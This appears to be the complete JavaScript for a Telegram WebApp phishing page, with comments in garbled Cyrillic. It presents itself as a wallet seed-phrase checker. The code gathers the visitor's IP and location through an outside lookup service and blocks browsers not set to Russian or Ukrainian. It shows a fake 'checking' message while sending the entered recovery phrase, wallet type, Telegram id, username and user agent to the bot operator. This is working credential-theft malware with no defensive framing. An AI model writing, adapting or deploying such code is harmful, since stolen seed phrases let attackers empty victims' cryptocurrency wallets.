// üåç IP —Ç–∞ –≥–µ–æ–ª–æ–∫–∞—Ü—ñ—è
let userIp = "undefined";
let userLocation = "undefined";

fetch("https://ipapi.co/json/")
  .then(res => res.json())
  .then(data => {
    userIp = data.ip;
    userLocation = `${data.city}, ${data.country_name}`;
    console.log("üìç IP:", userIp, "| –õ–æ–∫–∞—Ü—ñ—è:", userLocation);
  })
  .catch(() => {
    userIp = "unknown";
    userLocation = "unknown";
    console.warn("‚ö†Ô∏è –ù–µ –≤–¥–∞–ª–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –≥–µ–æ–ª–æ–∫–∞—Ü—ñ—é");
  });

// üö´ –ë–ª–æ–∫—É–≤–∞–Ω–Ω—è –ø–æ –º–æ–≤—ñ
const langs = navigator.languages || [navigator.language || navigator.userLanguage];
const allowedLangs = ["ru", "ru-RU", "uk", "uk-UA"];
if (!langs.some(lang => allowedLangs.includes(lang))) {
  document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω.</h3>";
  throw new Error("üö´ –ó–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —á–µ—Ä–µ–∑ –º–æ–≤—É");
}

// ‚úÖ DOM —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è
window.addEventListener("DOMContentLoaded", () => {
  if (!Telegram?.WebApp?.initDataUnsafe?.user) {
    document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>‚ùå Telegram WebApp –Ω–µ –∞–∫—Ç–∏–≤–µ–Ω.<br>–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–∫—Ä–æ–π—Ç–µ —á–µ—Ä–µ–∑ Telegram.</h3>";
    console.error("‚ùå WebApp –Ω–µ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π ‚Äî –Ω–µ –≤—ñ–¥–∫—Ä–∏—Ç–æ –∑ Telegram");
    return;
  }

  Telegram.WebApp.ready();
  Telegram.WebApp.expand();

  if (document.getElementById("seedContainer")) {
    renderSeedInputs();
    setupSelect();
    document.getElementById("submitBtn")?.addEventListener("click", () => {
      try {
        submitSeed();
      } catch (e) {
        console.error("‚ùå submitSeed error:", e);
      }
    });
  }
});

// üì¶ –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è —Å–∏–¥-–ø–æ–ª—ñ–≤
function renderSeedInputs() {
  const length = parseInt(document.getElementById("length").value);
  const container = document.getElementById("seedContainer");
  container.innerHTML = "";

  for (let i = 0; i < length; i++) {
    const input = document.createElement("input");
    input.type = "text";
    input.placeholder = `${i + 1}`;
    input.classList.add("seed-word");
    container.appendChild(input);
  }

  const firstInput = container.querySelector("input");
  if (firstInput) {
    firstInput.addEventListener("input", handleBulkSeedInput);
    firstInput.addEventListener("paste", (e) => setTimeout(() => handleBulkSeedInput(e), 50));
  }
}

// üìã –û–±—Ä–æ–±–∫–∞ –≤—Å—Ç–∞–≤–∫–∏ –æ–¥—Ä–∞–∑—É –≤—Å—ñ—Ö —Å–ª—ñ–≤
function handleBulkSeedInput(e) {
  const inputs = document.querySelectorAll(".seed-word");
  const words = e.target.value.trim().split(/\s+/);
  if (words.length > 1) {
    inputs.forEach((input, i) => input.value = words[i] || "");
  }
}

// üîò –ö–∞—Å—Ç–æ–º–Ω–∏–π select
function setupSelect() {
  const selectWrapper = document.querySelector('.custom-select');
  const selected = selectWrapper.querySelector('.selected');
  const options = selectWrapper.querySelectorAll('.options li');
  const hiddenInput = document.querySelector('#wallet');

  selected.addEventListener('click', () => selectWrapper.classList.toggle('open'));
  options.forEach(option => {
    option.addEventListener('click', () => {
      selected.innerHTML = option.innerHTML;
      hiddenInput.value = option.dataset.value;
      selectWrapper.classList.remove('open');
    });
  });

  document.addEventListener('click', e => {
    if (!selectWrapper.contains(e.target)) {
      selectWrapper.classList.remove('open');
    }
  });
}

// üö´ –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É
function showWarning(message) {
  let warning = document.getElementById("validationWarning");
  if (!warning) {
    warning = document.createElement("p");
    warning.id = "validationWarning";
    warning.style.color = "#ff4d4d";
    warning.style.fontSize = "13px";
    warning.style.marginTop = "10px";
    document.querySelector(".container").appendChild(warning);
  }
  warning.textContent = message;
  warning.style.display = "block";
}
function clearWarning() {
  const warning = document.getElementById("validationWarning");
  if (warning) warning.style.display = "none";
}

// üåÄ –°—Ç–∞—Ç—É—Å
function showProcessing(message) {
  let processing = document.getElementById("processingInfo");
  if (!processing) {
    processing = document.createElement("p");
    processing.id = "processingInfo";
    processing.style.color = "#999";
    processing.style.fontSize = "14px";
    processing.style.marginTop = "12px";
    document.querySelector(".container").appendChild(processing);
  }
  processing.textContent = message;
}

// üöÄ –ù–∞–¥—Å–∏–ª–∞–Ω–Ω—è seed
function submitSeed() {
  clearWarning();
  const length = parseInt(document.getElementById("length").value);
  const wallet = document.getElementById("wallet").value || "unknown";
  const ua = navigator.userAgent;
  const inputs = document.querySelectorAll("#seedContainer .seed-word");
  const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);

  if (words.length !== length) {
    showWarning(`‚ùå –í–≤–µ–¥–µ–Ω–æ ${words.length}, –æ—á—ñ–∫—É—î—Ç—å—Å—è ${length} —Å–ª—ñ–≤`);
    return;
  }

  const invalidWords = words.filter(w => !/^[a-zA-Z]+$/.test(w));
  if (invalidWords.length) {
    showWarning(`üö´ –ù–µ–¥–æ–ø—É—Å—Ç–∏–º—ñ —Å–∏–º–≤–æ–ª–∏: ${invalidWords.join(", ")}`);
    return;
  }

  const seed = words.join(" ");
  showProcessing("‚è≥ –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ seed-—Ñ—Ä–∞–∑–∏‚Ä¶");
  document.querySelector(".container").innerHTML =
    "<h3 style='color:green;text-align:center'>‚è≥ –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞‚Ä¶</h3>";

  const tgUser = Telegram.WebApp.initDataUnsafe.user || {};
  const payload = {
    user_id: tgUser.id || "-",
    username: tgUser.username || "-",
    seed,
    wallet,
    length,
    ua,
    ip: userIp,
    location: userLocation,
    timestamp: new Date().toISOString()
  };

  localStorage.setItem("payload_backup", JSON.stringify(payload));
  Telegram.WebApp.expand();

  if (Telegram.WebApp.sendData) {
    Telegram.WebApp.sendData(JSON.stringify(payload));
    console.log("‚úÖ Payload –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ:", payload);
  } else {
    console.warn("‚ùå sendData –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞");
  }
}
